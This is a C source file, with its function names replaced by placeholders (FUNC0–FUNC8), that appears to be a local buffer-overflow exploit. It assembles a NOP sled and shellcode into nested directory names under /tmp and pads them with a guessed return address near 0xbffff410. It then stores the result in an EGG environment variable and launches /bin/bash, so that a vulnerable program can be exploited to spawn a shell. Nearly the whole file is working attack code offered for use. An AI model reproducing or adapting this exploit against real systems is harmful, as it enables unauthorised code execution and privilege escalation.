#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*) ; 
 int /*<<< orphan*/  FUNC2 (char*,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,char*,int) ; 
 char* shellcode ; 
 char* shellpath ; 
 char* shellprog ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*) ; 
 int FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 

FUNC8(int argc, char **argv) {
        char *p,*p2, path[4096], shell[4096], command[4096], old[4096];
        int i,len, offs;
        unsigned long addr=0xbffff410;

        if(argc>1) {
                offs=FUNC0(argv[1]);
        } else {
                offs=0;
        }
        FUNC1("/tmp");
        addr+=offs;
        FUNC2("Using addr = 0x%08x\n", addr);

        // build a series of NOPs + shellcode and  make directory
        p=path;
        for(i=0;i<162-FUNC6(shellcode);i++)
                *(p++)=(char)0x90;
        p2=shellcode;
        for(i=0;i<FUNC6(shellcode);i++)
                *(p++)=*(p2++);
        *p=0;
        FUNC5(old, path);
        FUNC4(command,"mkdir \"%s\"", path);
        FUNC7(command);

        // add the path to the shell to the shellcode-cum-path
        for(i=0;i<FUNC6(shellpath);i++)
                *(p++)=shellpath[i];
        *p=0;
        FUNC4(command,"mkdir \"%s\"", path);
        FUNC7(command);

        // add the name of the shell to the shellcode-cum-path
        for(i=0;i<FUNC6(shellprog);i++)
                *(p++)=shellprog[i];
        *p=0;
        FUNC2("strlen(path)=%d\n", FUNC6(path));
        FUNC4(command,"mkdir \"%s\"", path);
        FUNC7(command);

        // pad out the buffer with our RET address
        for(i=0;i<172;i++)
        {
                *(p++)=(char)(addr>>16)&0xff;
                *(p++)=(char)(addr>>24)&0xff;
                *(p++)=(char)addr&0xff;
                *(p++)=(char)(addr>>8)&0xff;
        }
        addr=(unsigned long)*(p-4);
        FUNC2("ADDRESS: 0x%x\n", addr);
        *p=0;
        FUNC2("strlen(path)=%d\n", FUNC6(path));
        FUNC4(command,"mkdir \"%s\"", path);
        FUNC7(command);

        // set environment variable and spawn a fresh shell
        FUNC3("EGG",path,1);
        FUNC7("/bin/bash");
}